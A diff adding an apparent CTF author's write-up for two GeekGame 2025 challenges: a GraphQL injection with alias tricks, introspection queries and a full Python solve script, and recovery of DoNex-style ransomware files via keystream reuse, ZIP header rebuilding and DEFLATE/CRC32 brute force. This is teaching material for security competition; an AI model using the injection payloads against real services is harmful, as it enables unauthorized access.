@@ -7,8 +7,1047 @@ tags:
 -   ctf
 ---
 
-GeekGame 2025 【统一身份认证】（web-graphauth）和【勒索病毒】（misc-ransomware）的出题人题解。
+GeekGame 2025[【统一身份认证】（web-graphauth）](https://github.com/PKU-GeekGame/geekgame-5th/tree/master/official_writeup/web-graphauth)和[【勒索病毒】（misc-ransomware）](https://github.com/PKU-GeekGame/geekgame-5th/tree/master/official_writeup/misc-ransomware)的出题人题解。
 
 <Excerpt />
 
-别急，等 WP ddl 过了手动发
+## 统一身份认证
+
+### Flag 1
+
+在登录和注册时，直接将用户输入拼接在了 GraphQL 查询中，用引号就可以闭合字符串进行注入。
+
+```python
+query = f'''
+query ($username: String = "{username}", $password: String = "{password}") {{
+  login(username: $username, password: $password) {{
+    ok
+    isAdmin
+    username
+  }}
+}}
+'''
+```
+
+攻击目标是返回 `"login": { "ok": true, "isAdmin": true, "username": "xxx" }`，而查询中本来有的这个 `login` 没法篡改，只能注入一个新的 `login`。代码中检查 `ok` 时只需要 truthy 即可，而检查 `isAdmin` 时写的是 `== True`，所以必须是 `true`，而能够返回 `true` 的除了 `isAdmin` 只有 `ok`，通过 [alias](https://graphql.org/learn/queries/#aliases)，可以让返回值中的 `isAdmin` 字段放 `ok` 的值。
+
+
+```graphql
+query ($username: String = "username", $password: String = "password") {
+  login(username: $username, password: $password) {
+    ok
+    isAdmin: ok
+    username
+  }") {
+  login(username: $username, password: $password) {
+    ok
+    isAdmin
+    username
+  }
+}
+```
+
+此时还需要处理掉查询语句中的 `") {` 以及原有的这个 `login`。`") {` 通过注释 `#` 就可以处理。原有的 `login` 会造成重复而出错，给一个 alias 就行：
+
+```graphql
+query ($username: String = "username", $password: String = "password") {
+  login(username: $username, password: $password) {
+    ok
+    isAdmin: ok
+    username
+  }
+  original: #") {
+  login(username: $username, password: $password) {
+    ok
+    isAdmin
+    username
+  }
+}
+```
+
+<Card type="hint" title="使用 GraphQL variable">
+
+就像在 SQL 中应当使用 prepared statement，在 GraphQL 中也应当使用 [variable](https://graphql.org/learn/queries/#variables) 来传递数据，而不应将用户输入直接拼接在查询中。
+
+</Card>
+
+### Flag 2
+
+schema 是未知的，要拿到 flag 就需要先获取 schema。GraphQL 提供了 [introspection](https://graphql.org/learn/introspection/) 功能，可以通过 GraphQL query 来查询 schema。
+
+GraphQL introspection 有三个主要方法：
+
+-   在任何地方都可以问 `__typename` 得到类型名
+-   在 `Query` 可以问 `__type(name: "Type")` 获取特定类型的 schema
+-   在 `Query` 可以问 `__schema` 获取整个 schema
+
+通过 `__schema { types { ... } }` 就可以一次性获取整个 schema 中需要的信息：
+
+```graphql
+login: __schema {
+  ok: __typename
+  isAdmin: __typename
+  username: types {
+    name
+    fields {
+      name
+      type {
+        name
+      }
+    }
+  }
+}
+```
+
+而由于 flag 藏的不是特别深，也可以一层层问下去：
+
+```graphql
+__type(name: "Secret") {
+  ok: name
+  isAdmin: name
+  username: fields {
+    name
+    type {
+      name
+      fields {
+        name
+        type {
+          name
+          fields {
+            name
+            type {
+              name
+              fields {
+                name
+                type {
+                  name
+                  fields {
+                    name
+                    type {
+                      name
+                      fields {
+                        name
+                        type {
+                          name
+                          fields {
+                            name
+                            type {
+                              name
+                              fields {
+                                name
+                                type { name }
+                              }
+                            }
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+
+拿到 schema 之后，就可以查询 flag 了。利用 `login` 中的 `username` 进行回显，需要给 `ok` 和 `isAdmin` 填东西，让 `ok` 为 truthy。如果都查 flag，整个询问太长，无法通过一开始的 256 长度限制，但后来这个限制被放宽了，所以就够了：`secret {{ ok: {query} isAdmin: {query} username: {query} }}`
+
+我有四种询问构造方法可以缩短长度：
+
+-   可以使用 `__typename`：`login: secret {{ ok: __typename isAdmin: __typename username: {query} }}`
+
+-   实际上，观察代码可以发现，如果缺少 `isAdmin` 字段，虽然会返回“登录失败”，但此时 `session['username']` 已赋值，可以拿到回显，所以不需要 `isAdmin` 字段：`login: secret {{ ok: {query} username: {query} }}`
+
+-   可以使用 fragment 把重复的 flag 查询提取出来：
+    ```python
+    f'''
+    login: secret {{
+        ok: secret_{xxx} {{ ... i }}
+        isAdmin: secret_{xxx} {{ ... i }}
+        username: secret_{xxx} {{ ... i }}
+      }}
+      ... l
+    }}
+    fragment i on Secret_{yyy} {{
+      {inner_query}
+    }}
+    fragment l on Query {{
+        x: #'''
+    ```
+
+-   还可以找到最浅的叶子节点（scalar value）代替 flag 放到 `ok` 和 `isAdmin`。根据 schema 的随机生成方式，有 94% 的概率（没算错的话）payload 长度能在 256 以内；如果你非常不幸，可以重开题目。
+
+除了上面这些查询构造方法，还可以在发送 payload 时同时利用 `username` 和 `password`，只不过由于 `username` 长度限制太小，这个优化效果不大：`username` 填 `",$password:String=""){login:#`，`password` 填 `\n{payload}x:#`，可以省下 `){login:`。另外，把 object 放前面 scalar 放后面可以利用大括号省去一个空格。
+
+但这些都是我在开赛后发现有人被卡长度才想到的，一开始根本没意识到这里会卡住（
+
+完整脚本（这个是纯自动的，包含上面提到的各种做法，实际做不需要纯自动，比如可以手动得到 flag 询问路径）：
+
+```python
+from ast import literal_eval
+from html import unescape
+from http.cookies import SimpleCookie
+import os
+import re
+import requests
+import secrets
+
+URL = os.environ.get('URL', 'http://localhost:5000')
+COOKIE = os.environ.get('COOKIE', '')
+
+cookie = SimpleCookie()
+cookie.load(COOKIE)
+session = requests.Session()
+session.cookies.update({k: v.value for k, v in cookie.items()})
+
+
+def register(username, password):
+    res = session.post(
+        f'{URL}/register',
+        data={'username': username, 'password': password}
+    )
+    res.raise_for_status()
+
+
+def login(username, password):
+    print(f'{username = }')
+    print(f'{password = }')
+    res = session.post(
+        f'{URL}/login',
+        data={'username': username, 'password': password}
+    )
+    res.raise_for_status()
+    return res.text
+
+
+def sol1():
+    username = secrets.token_hex(16)
+    password = secrets.token_hex(16)
+    register(username, password)
+
+    payload = f'''{password}") {{
+    login(username: $username, password: $password) {{
+      ok
+      isAdmin: ok
+      username
+    }}
+    originalQuery:
+    #'''
+
+    print(login(username, payload))
+
+
+def send(payload: str):
+    payload = re.sub(r"\s+", ' ', payload)
+    payload = re.sub(r"^ | $|(?<=\W) | (?=\W)", '', payload)
+    # res = login('x', f'"){{login:{payload}x:#')
+    res = login('",$password:String=""){login:#', f'\n{payload}x:#')
+    username = re.search(r'用户名</strong>\s*<div>(.*?)</div>', res)
+    assert username is not None
+    return literal_eval(unescape(username.group(1)))
+
+
+def introspection1():
+    introspection = '''
+    __schema {
+      ok: __typename
+      username: types {
+        name
+        fields {
+          name
+          type {
+            name
+          }
+        }
+      }
+    }
+    '''
+
+    fields = {}
+
+    types = send(introspection)
+
+    for t in types:
+        if t.get('fields') is None:
+            continue
+        fields[t['name']] = {}
+        for f in t['fields']:
+            fields[t['name']][f['name']] = f['type']['name']
+
+    return fields
+
+
+def introspection2():
+    introspection = '''
+    __type(name: "Secret") {
+      ok: name
+      username: fields {
+        name
+        type {
+          name
+          fields {
+            name
+            type {
+              name
+              fields {
+                name
+                type {
+                  name
+                  fields {
+                    name
+                    type {
+                      name
+                      fields {
+                        name
+                        type {
+                          name
+                          fields {
+                            name
+                            type {
+                              name
+                              fields {
+                                name
+                                type {
+                                  name
+                                  fields {
+                                    name
+                                    type { name }
+                                  }
+                                }
+                              }
+                            }
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+    '''
+
+    secret_fields = send(introspection)
+
+    fields = {}
+
+    def dfs(u):
+        if u['name'] in fields or u.get('fields') is None:
+            return
+        fields[u['name']] = {}
+        for f in u['fields']:
+            fields[u['name']][f['name']] = f['type']['name']
+            dfs(f['type'])
+
+    dfs({'name': 'Secret', 'fields': secret_fields})
+
+    return fields
+
+
+def bfs(fields):
+    path = {'Secret': '<SLOT>'}
+    queue = ['Secret']
+
+    while len(queue) > 0:
+        u = queue.pop(0)
+        if u not in fields:
+            continue
+        for f, v in fields[u].items():
+            if v not in path:
+                path[v] = path[u].replace('<SLOT>', f'{f}{{<SLOT>}}')
+                queue.append(v)
+
+    return path
+
+
+def flag_query(fields, path):
+    for u in fields:
+        for f in fields[u]:
+            if f == 'flag2':
+                return path[u].replace('<SLOT>', f)
+
+
+def get_short(fields):
+    """shortest payload"""
+    path = bfs(fields)
+    query = flag_query(fields, path)
+    res = send(f'secret {{ username: {query} ok: __typename }}')
+    print(res)
+
+
+def get_long(fields):
+    """long payload"""
+    path = bfs(fields)
+    query = flag_query(fields, path)
+    res = send(f'secret {{ ok: {query} isAdmin: {query} username: {query} }}')
+    print(res)
+
+
+def get1(fields):
+    """use __typename"""
+    path = bfs(fields)
+    query = flag_query(fields, path)
+    res = send(f'secret {{ ok: __typename isAdmin: __typename username: {query} }}')
+    print(res)
+
+
+def get2(fields):
+    """omit isAdmin"""
+    path = bfs(fields)
+    query = flag_query(fields, path)
+    res = send(f'secret {{ ok: {query} username: {query} }}')
+    print(res)
+
+
+def get3(fields):
+    """use fragment"""
+
+    path = bfs(fields)
+    query = flag_query(fields, path)
+    assert query is not None
+
+    query_match = re.match(r'(\w+)\{(.*)\}', query)
+    assert query_match is not None
+    outer = query_match.group(1)
+    inner = query_match.group(2)
+
+    res = send(f'''secret {{
+        ok: {outer} {{ ... i }}
+        isAdmin: {outer} {{ ... i }}
+        username: {outer} {{ ... i }}
+      }}
+      ... l
+    }}
+    fragment i on {fields["Secret"][outer]} {{
+      {inner}
+    }}
+    fragment l on Query {{
+    ''')
+
+    print(res)
+
+
+def get4(fields):
+    """use shortest leaf"""
+
+    path = bfs(fields)
+    query = flag_query(fields, path)
+
+    shortest = 'a' * 1000
+    for u, p in path.items():
+        if u not in fields:
+            continue
+        for f in fields[u]:
+            if f.startswith('not_flag'):
+                q = p.replace('<SLOT>', f)
+                if len(q) < len(shortest):
+                    shortest = q
+
+    res = send(f'secret {{ ok: {shortest} isAdmin: {shortest} username: {query} }}')
+    print(res)
+
+
+def sol2():
+    fields = introspection1()
+    # fields = introspection2()
+
+    get_short(fields)
+    # get_long(fields)
+    # get1(fields)
+    # get2(fields)
+    # get3(fields)
+    # get4(fields)
+
+
+def easter_egg():
+    query = '''secret {
+      ok: __typename
+      username: not_part_of_challenge {
+        selectOnePresetData(presetKey: "103765749452800", XH: "2025019999", KCH: "77777777") {
+          XH KCH KSRQ XNXQ XF KCMC ZCJ
+        }
+      }
+    }'''
+    print(send(query))
+
+
+sol1()
+
+sol2()
+
+easter_egg()
+```
+
+这个最短的 payload 只需要 130 字符的 `password`：
+
+```
+username = '",$password:String=""){login:#'
+password = '\n__schema{ok:__typename username:types{name fields{name type{name}}}}x:#'
+username = '",$password:String=""){login:#'
+password = '\nsecret{username:secret_EKFB{secret_BUNy{secret_3gjd{secret_695y{secret_DL6P{secret_A1NB{secret_r6H0{flag2}}}}}}}ok:__typename}x:#'
+```
+
+这题的 rate limit 主要是用来 ban 掉每次用 `__type(name: "Secret_XXX")` 只查一个类型的单层字段，但如果你每问 200 次就重启一次容器，理论上可以在数十小时内尝试成功（
+
+<Card type="hint" title="不要依赖于隐藏路由">
+
+GraphQL 默认开启 introspection，整个 schema 都是公开的。可以关闭 introspection 功能，但更好的做法是不要让应用的安全性依赖于 schema 的隐蔽性，[security through obscurity](https://en.wikipedia.org/wiki/Security_through_obscurity) 是不好的。
+
+</Card>
+
+### 彩蛋
+
+这题的 schema 中还有一个彩蛋，本来发现它还比较困难，但给了一个 `secret.gql` 示例其实就容易发现了，但还是没人玩（
+
+```graphql
+type NotPartOfChallenge {
+  selectOnePresetData(presetKey: String!, XH: String!, KCH: String!): Preset103765749452800
+  formParser(status: String!, presetbind: String!, XH: String!, KCH: String!): Preset103765749452800
+}
+
+type Preset103765749452800 {
+  msg: String
+  status: String
+  XH: String
+  KCH: String
+  KSRQ: String
+  XNXQ: String
+  XF: Int
+  KCMC: String
+  ZCJ: Int
+}
+```
+
+THU 三字班以上的同学或许知道这是什么（
+
+```json
+{
+  "selectOnePresetData": {
+    "KCH": "77777777",
+    "KCMC": "2025 “京华杯” 信息安全综合能力竞赛",
+    "KSRQ": "20251024",
+    "XF": 7,
+    "XH": "2025019999",
+    "XNXQ": "2025-2026-1",
+    "ZCJ": -99
+  }
+}
+```
+
+## 勒索病毒
+
+令人遗憾的是这题题面确实没有彩蛋（
+
+P.S. 题目背景仅供娱乐，我不仅日常用 Linux，甚至双系统的 Windows 坏了几个月一直懒得修（
+
+### Flag 1
+
+根据勒索信可以搜到关于 DoNex 的资料，比如 decryptor，以及 [Cryptography is hard: Breaking the DoNex ransomware :: Recon 2024](https://cfp.recon.cx/recon2024/talk/LQ8B7H/)。
+
+漏洞很简单，就是重用了流密码，所以把已知明文、对应的密文、另一个密文异或在一起就能得到另一个明文。被加密的文件中有上一届的 `algo-gzip.py`，就有了已知明文。
+
+如果直接用 decryptor，可能会提示解密不了，这是因为长度不对，而长度不对是因为被加密的文件是 CRLF，而从 GitHub 下载的文件是 LF，需要转换一下。如果你注意力惊人，或者在 Windows 上采用默认 Git 配置 checkout 文件而非从 GitHub 网页下载，就能直接拿到 CRLF 的 `algo-gzip.py`。而如果你是自己写的异或解密而不是用的现成的 decryptor，没有先检查文件长度，你就会发现解密出来开头是 `This file contaiiZ#`，后面都是乱码，此时，结合 `algo-gzip.py` 第一行的长度，只需要不惊人的注意力就能意识到，可能是 CRLF 的问题。
+
+```python
+root = argv[1]
+
+with open('algo-gzip.py', 'rb') as f:
+    known = f.read()
+
+with open(f'{root}/geekgame-4th/official_writeup/algo-gzip/attachment/algo-gzip.f58A66B51.py', 'rb') as f:
+    known_encrypted = f.read()
+
+with open(f'{root}/geekgame-5th/problemset/misc-ransomware/flag1-2-3.f58A66B51.txt', 'rb') as f:
+    flags_encrypted = f.read()
+
+flags_partial = bytes(a ^ b ^ c for a, b, c in zip(known, known_encrypted, flags_encrypted))
+print(flags_partial)
+flag1 = re.search(br'flag\{.+?\}', flags_partial).group(0).decode()
+print(f'{flag1 = }\n')
+```
+
+### Flag 2
+
+`algo-gzip.py` 只提供了开头一段密钥，继续解密需要更多的已知明文。附件里有一个声称没有存储 flag 的 ZIP 文件，而 ZIP 文件格式中很多信息会冗余存储，所以可以从不完整的 ZIP 文件中恢复一些缺失的部分（从 LFH 恢复 CDH 和 EOCD）。根据文件长度可以确定 ZIP 里没有第三个文件。可以搜一篇教程或者看 [APPNOTE.TXT](https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT) 学习一下 ZIP 文件结构。当然，也可以让 AI 写，或者用一些现成的工具。
+
+CDH 中有一些 LFH 没有的字段，其中最难确定的是 external attributes，但我特意让 flag 从这个字段开始，如果设为 0 会得到 `fl\xe1f{`，把它修复为 `flag{`，后面也用相同的值就可以修复。当然，直接猜也是可以的，考察第三人称单数的使用，以及识别 `^T` 是一个字符还是两个字符。
+
+```python
+from construct import Struct, Int32ul, Int16ul, Bytes, this
+
+LFH_SIGNATURE = 0x04034b50
+LocalFileHeader = Struct(
+    "signature" / Int32ul,
+    "version_needed" / Int16ul,
+    "flags" / Int16ul,
+    "compression" / Int16ul,
+    "mod_time" / Int16ul,
+    "mod_date" / Int16ul,
+    "crc32" / Int32ul,
+    "compressed_size" / Int32ul,
+    "uncompressed_size" / Int32ul,
+    "filename_length" / Int16ul,
+    "extra_length" / Int16ul,
+    "filename" / Bytes(this.filename_length),
+    "extra" / Bytes(this.extra_length)
+)
+
+CDH_SIGNATURE = 0x02014b50
+CentralDirHeader = Struct(
+    "signature" / Int32ul,
+    "version_made_by" / Int16ul,
+    "version_needed" / Int16ul,
+    "flags" / Int16ul,
+    "compression" / Int16ul,
+    "mod_time" / Int16ul,
+    "mod_date" / Int16ul,
+    "crc32" / Int32ul,
+    "compressed_size" / Int32ul,
+    "uncompressed_size" / Int32ul,
+    "filename_length" / Int16ul,
+    "extra_length" / Int16ul,
+    "comment_length" / Int16ul,
+    "disk_number_start" / Int16ul,
+    "internal_attrs" / Int16ul,
+    "external_attrs" / Int32ul,
+    "local_header_offset" / Int32ul,
+    "filename" / Bytes(this.filename_length),
+    "extra" / Bytes(this.extra_length),
+    "comment" / Bytes(this.comment_length)
+)
+
+EOCDR_SIGNATURE = 0x06054b50
+Eocdr = Struct(
+    "signature" / Int32ul,
+    "disk_number" / Int16ul,
+    "disk_start" / Int16ul,
+    "disk_entries" / Int16ul,
+    "total_entries" / Int16ul,
+    "cd_size" / Int32ul,
+    "cd_offset" / Int32ul,
+    "comment_length" / Int16ul,
+    "comment" / Bytes(this.comment_length)
+)
+```
+
+```python
+zip_partial = bytes(a ^ b ^ c for a, b, c in zip(known, known_encrypted, zip_encrypted))
+zip_io = BytesIO(zip_partial)
+
+lfh1 = LocalFileHeader.parse_stream(zip_io)
+assert lfh1 is not None
+data1 = zip_io.read(lfh1.compressed_size)
+offset2 = zip_io.tell()
+
+lfh2 = LocalFileHeader.parse_stream(zip_io)
+assert lfh2 is not None
+data2_offset = zip_io.tell()
+data2_head = zip_io.read()
+
+zip_io.write(b'\0' * (lfh2.compressed_size - len(data2_head)))
+cd_offset = zip_io.tell()
+
+external_attrs = 0x1800000
+
+cdh1 = CentralDirHeader.build(dict(
+    signature=CDH_SIGNATURE,
+    version_made_by=lfh1.version_needed,
+    version_needed=lfh1.version_needed,
+    flags=lfh1.flags,
+    compression=lfh1.compression,
+    mod_time=lfh1.mod_time,
+    mod_date=lfh1.mod_date,
+    crc32=lfh1.crc32,
+    compressed_size=lfh1.compressed_size,
+    uncompressed_size=lfh1.uncompressed_size,
+    filename_length=lfh1.filename_length,
+    extra_length=0,
+    comment_length=0,
+    disk_number_start=0,
+    internal_attrs=0,
+    external_attrs=external_attrs,
+    local_header_offset=0,
+    filename=lfh1.filename,
+    extra=bytes(),
+    comment=bytes(),
+))
+zip_io.write(cdh1)
+
+cdh2 = CentralDirHeader.build(dict(
+    signature=CDH_SIGNATURE,
+    version_made_by=lfh2.version_needed,
+    version_needed=lfh2.version_needed,
+    flags=lfh2.flags,
+    compression=lfh2.compression,
+    mod_time=lfh2.mod_time,
+    mod_date=lfh2.mod_date,
+    crc32=lfh2.crc32,
+    compressed_size=lfh2.compressed_size,
+    uncompressed_size=lfh2.uncompressed_size,
+    filename_length=lfh2.filename_length,
+    extra_length=0,
+    comment_length=0,
+    disk_number_start=0,
+    internal_attrs=0,
+    external_attrs=external_attrs,
+    local_header_offset=offset2,
+    filename=lfh2.filename,
+    extra=bytes(),
+    comment=bytes(),
+))
+zip_io.write(cdh2)
+
+eocdr = Eocdr.build(dict(
+    signature=EOCDR_SIGNATURE,
+    disk_number=0,
+    disk_start=0,
+    disk_entries=2,
+    total_entries=2,
+    cd_size=len(cdh1)+len(cdh2),
+    cd_offset=cd_offset,
+    comment_length=0,
+    comment=bytes(),
+))
+zip_io.write(eocdr)
+
+zip_io.seek(0)
+zip_complete = zip_io.read()
+
+flags_partial2 = bytes(a ^ b ^ c for a, b, c in zip(flags_encrypted, zip_encrypted, zip_complete))[cd_offset:]
+print(flags_partial2)
+flag2 = re.search(br'flag\{.+?\}', flags_partial2).group(0).decode()
+print(f'{flag2 = }\n')
+```
+
+### Flag 3
+
+最后文件中未知的还有两段，一段是压缩数据，一段是超过 ZIP 文件长度的末尾，显然只有前者是能破解的（除非末尾的密钥能破解）；实际上我在 `gen.py` 里往后者塞了一个假 flag，但这对结果其实没有任何影响。
+
+学习 DEFLATE 数据结构，然后解析一下已知的开头部分，可以发现它的动态 Huffman 树已经确定。观察编码可以发现，只有 6 个 literal 编码非零，长度分别为 1、2、3、4、14、15。而根据 ZIP 字段中记录的长度，这个 DEFLATE 是把 30 字节的原数据编码成了约 90 字节。从编码后长度中减去 DEFLATE header 的长度，再考虑到最后一个 byte 可能有 1\~8 个 bit，可以得到编码数据减去末尾 EOB 的长度可能为 440\~447。如果数据中包含编码长度为 1\~4 的 literal，编码后长度就会小于 440，而如果采用了 distance length pair，则会更短。因此，数据中只可能包含编码长度为 14、15 的 literal，具体来说是 3\~10 个编码长度为 14 的 literal，剩下的为编码长度为 15 的 literal。
+
+于是，数据的构成就基本确定了，只需枚举 $5.3 \times 10^7$ 种排列组合。而 ZIP 字段中提供了 CRC32 校验和，可以用来校验哪个排列是正确的。后来才想到，除了 CRC32，还可以根据 flag 都是 ASCII 可见字符来筛选，这样有一些别的做法，但可能还更麻烦。
+
+P.S. 感觉这题造 DEFLATE 编码以及对齐明文和 flag 的位置比做题难（在思路已知的前提下（
+
+P.P.S. 各种排列组合的 CRC32 似乎都没有冲突（如果是随机的 32bit 则会有大量重复），我怀疑这是可以证明的，但我不懂这个，就造完数据后枚举一遍来保证唯一性了（
+
+```python
+deflate_info = parse_deflate_dynamic_header(data2_head, 3)
+
+litlen_tree = deflate_info['litlen_tree']
+l14 = 0
+l15 = 0
+c14 = (0, 0)
+c15 = (0, 0)
+eob_code = (0, 0)
+print('literal codes:')
+for code, sym in litlen_tree.items():
+    if sym < 256:
+        print(f'{sym}: {code}')
+        if code[1] == 14:
+            l14 = sym
+            c14 = code
+        elif code[1] == 15:
+            l15 = sym
+            c15 = code
+    elif sym == 256:
+        eob_code = code
+
+n = lfh2.uncompressed_size
+deflate_header_len = deflate_info['bits_consumed'] + 3
+max_total_lit_len = lfh2.compressed_size * 8 - deflate_header_len - eob_code[1]
+min_total_lit_len = max_total_lit_len - 7
+all_15_len = 15 * n
+print(f'{min_total_lit_len = }, {all_15_len = }')
+min_14_count = all_15_len - max_total_lit_len
+max_14_count = all_15_len - min_total_lit_len
+
+for mask in tqdm(range(1 << n)):
+    if not min_14_count <= mask.bit_count() <= max_14_count:
+        continue
+    data = bytes(l14 if (mask >> i) & 1 else l15 for i in range(n))
+    if crc32(data) == lfh2.crc32:
+        bits = BitWriter()
+        bits.bytes.extend(data2_head[:deflate_header_len // 8])
+        bits.bit_count = deflate_header_len % 8
+        if bits.bit_count != 0:
+            bits.current_byte = data2_head[deflate_header_len // 8] & ((1 << bits.bit_count) - 1)
+        for i in range(n):
+            code = c14 if (mask >> i) & 1 else c15
+            bits.write_bits(*code)
+        bits.write_bits(*eob_code)
+        deflated = bits.get_bytes()
+        flags_flag3 = bytes(a ^ b ^ c for a, b, c in zip(
+            flags_encrypted[data2_offset:],
+            zip_encrypted[data2_offset:],
+            deflated,
+        ))
+        tqdm.write(str(flags_flag3))
+        match = re.search(br'flag\{.+?\}', flags_flag3)
+        if match is None:
+            continue
+        flag3 = match.group(0).decode()
+        tqdm.write(f'{flag3 = }')
+        break
+```
+
+DEFLATE header 的解析是纯 AI 写的：
+
+```python
+from typing import Tuple, Dict, List
+
+class BitReader:
+    def __init__(self, data: bytes, bitpos: int = 0):
+        self.data = data
+        self.bytepos = bitpos // 8
+        self.bitpos = bitpos % 8  # 0..7, LSB-first within each byte (deflate)
+        self.total_bits_read = bitpos
+
+    def read_bits(self, n: int) -> int:
+        """Read n bits (n <= 32) and return as integer (LSB-first)."""
+        val = 0
+        bits_read = 0
+        while bits_read < n:
+            if self.bytepos >= len(self.data):
+                raise EOFError("Not enough data while reading bits")
+            avail = 8 - self.bitpos
+            take = min(n - bits_read, avail)
+            current_byte = self.data[self.bytepos]
+            # extract bits (LSB-first)
+            chunk = (current_byte >> self.bitpos) & ((1 << take) - 1)
+            val |= chunk << bits_read
+            bits_read += take
+            self.bitpos += take
+            self.total_bits_read += take
+            if self.bitpos == 8:
+                self.bitpos = 0
+                self.bytepos += 1
+        return val
+
+    def get_bitpos(self):
+        return self.total_bits_read
+
+class BitWriter:
+    def __init__(self):
+        self.bytes = bytearray()
+        self.current_byte = 0
+        self.bit_count = 0
+
+    def write_bits(self, value: int, num_bits: int):
+        for i in range(num_bits):
+            bit = (value >> i) & 1
+            self.current_byte |= bit << self.bit_count
+            self.bit_count += 1
+
+            if self.bit_count == 8:
+                self.bytes.append(self.current_byte)
+                self.current_byte = 0
+                self.bit_count = 0
+
+    def get_bytes(self) -> bytes:
+        if self.bit_count > 0:
+            self.bytes.append(self.current_byte)
+        return bytes(self.bytes)
+
+def reverse_bits(value: int, bitlen: int) -> int:
+    """Reverse `bitlen` lowest bits of value."""
+    rev = 0
+    for _ in range(bitlen):
+        rev = (rev << 1) | (value & 1)
+        value >>= 1
+    return rev
+
+def build_canonical_huffman(code_lengths: List[int]) -> Tuple[Dict[Tuple[int,int], int], int]:
+    """
+    Build canonical Huffman mapping from symbol -> length to (code_rev, length) -> symbol,
+    where code_rev is the integer value you'd get by reading bits LSB-first from the stream.
+    Returns (mapping, max_length).
+    mapping keys are (code_as_int_read_lsb_first, length) -> symbol
+    """
+    max_bits = max(code_lengths) if code_lengths else 0
+    # Count of codes for each length
+    bl_count = [0] * (max_bits + 1)
+    for l in code_lengths:
+        if l > 0:
+            bl_count[l] += 1
+
+    # Determine the first code for each length (canonical)
+    next_code = [0] * (max_bits + 1)
+    code = 0
+    for bits in range(1, max_bits + 1):
+        code = (code + bl_count[bits - 1]) << 1
+        next_code[bits] = code
+
+    mapping: Dict[Tuple[int,int], int] = {}
+    for symbol, length in enumerate(code_lengths):
+        if length != 0:
+            assigned_code = next_code[length]
+            next_code[length] += 1
+            # canonical codes are MSB-first; but DEFLATE bitstream is LSB-first,
+            # so reverse bits when storing for direct lookup of bit sequences read LSB-first.
+            code_lsb_first = reverse_bits(assigned_code, length)
+            mapping[(code_lsb_first, length)] = symbol
+
+    return mapping, max_bits
+
+# order of code length code lengths (RFC 1951 3.2.7)
+CL_ORDER = [16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15]
+
+def parse_deflate_dynamic_header(data: bytes, bitpos: int = 0):
+    """
+    Parse a dynamic Huffman header from a deflate stream starting at given bitpos.
+    Returns (litlen_tree, dist_tree, bits_consumed, nlits, ndists, code_lengths) where:
+      - litlen_tree and dist_tree: mapping (code_as_int_read_lsb_first, length) -> symbol
+      - bits_consumed: number of bits consumed from the starting bitpos
+      - nlits: number of literal/length codes (HLIT + 257)
+      - ndists: number of distance codes (HDIST + 1)
+      - code_lengths: combined list of literal+distance code lengths
+    """
+    br = BitReader(data, bitpos)
+
+    HLIT = br.read_bits(5)      # number of literal/length codes - 257
+    HDIST = br.read_bits(5)     # number of distance codes - 1
+    HCLEN = br.read_bits(4)     # number of code length codes - 4
+
+    nlits = HLIT + 257
+    ndists = HDIST + 1
+    nclen = HCLEN + 4
+
+    # read code length code lengths (3 bits each) in CL_ORDER
+    cl_code_lengths = [0] * 19
+    for i in range(nclen):
+        val = br.read_bits(3)
+        cl_code_lengths[CL_ORDER[i]] = val
+
+    # build Huffman for code-length alphabet (symbols 0..18)
+    cl_mapping, cl_maxbits = build_canonical_huffman(cl_code_lengths)
+
+    # helper to decode one symbol from a mapping
+    def decode_symbol_from_mapping(reader: BitReader, mapping: Dict[Tuple[int,int], int], max_len: int) -> int:
+        """Read up to max_len bits LSB-first trying to match a (code,length) key."""
+        code = 0
+        for length in range(1, max_len + 1):
+            b = reader.read_bits(1)
+            code |= (b << (length - 1))  # accumulate LSB-first
+            key = (code, length)
+            if key in mapping:
+                return mapping[key]
+        raise ValueError("No matching Huffman code found while decoding")
+
+    # decode the code lengths for literal/length + distance alphabets
+    total_codes = nlits + ndists
+    code_lengths = []
+    prev_len = 0
+    while len(code_lengths) < total_codes:
+        sym = decode_symbol_from_mapping(br, cl_mapping, cl_maxbits)
+        if 0 <= sym <= 15:
+            code_lengths.append(sym)
+            prev_len = sym
+        elif sym == 16:
+            # copy previous length 3-6 times (2 extra bits)
+            if len(code_lengths) == 0:
+                raise ValueError("Code 16 with no previous length")
+            repeat = br.read_bits(2) + 3
+            code_lengths.extend([prev_len] * repeat)
+        elif sym == 17:
+            # repeat zero 3-10 times (3 extra bits)
+            repeat = br.read_bits(3) + 3
+            code_lengths.extend([0] * repeat)
+            prev_len = 0
+        elif sym == 18:
+            # repeat zero 11-138 times (7 extra bits)
+            repeat = br.read_bits(7) + 11
+            code_lengths.extend([0] * repeat)
+            prev_len = 0
+        else:
+            raise ValueError(f"Invalid symbol in code-length alphabet: {sym}")
+
+        # guard: don't overflow total
+        if len(code_lengths) > total_codes:
+            # If the header is malformed we might read too many; trim and continue
+            code_lengths = code_lengths[:total_codes]
+
+    # split into literal/length and distance code length arrays
+    litlen_lengths = code_lengths[:nlits]
+    dist_lengths = code_lengths[nlits:nlits+ndists]
+
+    # build canonical Huffman trees for literal/length and distance
+    litlen_tree, litlen_max = build_canonical_huffman(litlen_lengths)
+    dist_tree, dist_max = build_canonical_huffman(dist_lengths)
+
+    bits_consumed = br.get_bitpos() - bitpos
+    return {
+        "litlen_tree": litlen_tree,
+        "litlen_max_bits": litlen_max,
+        "dist_tree": dist_tree,
+        "dist_max_bits": dist_max,
+        "bits_consumed": bits_consumed,
+        "nlits": nlits,
+        "ndists": ndists,
+        "litlen_lengths": litlen_lengths,
+        "dist_lengths": dist_lengths
+    }
+
+def decode_symbol_from_tree(reader: BitReader, tree: Dict[Tuple[int,int], int], max_len: int) -> int:
+    """
+    Decode a symbol from `reader` using the provided tree mapping produced by build_canonical_huffman.
+    The reader will be advanced by the number of bits used.
+    """
+    code = 0
+    for length in range(1, max_len + 1):
+        b = reader.read_bits(1)
+        code |= (b << (length - 1))
+        key = (code, length)
+        if key in tree:
+            return tree[key]
+    raise ValueError("No matching code in tree")
+```
+
+### 事故
+
+非常抱歉，计算 flag 1 放置位置的代码写挂了（
+
+我一直以为先交 2/3 的是在屯，快到第二阶段才想到去检查一下附件，也没注意 flag 提交记录里的半截 flag（
+
+这 Python 太坏了，要是 Rust 早发现了（
+
+## 梗指南
+
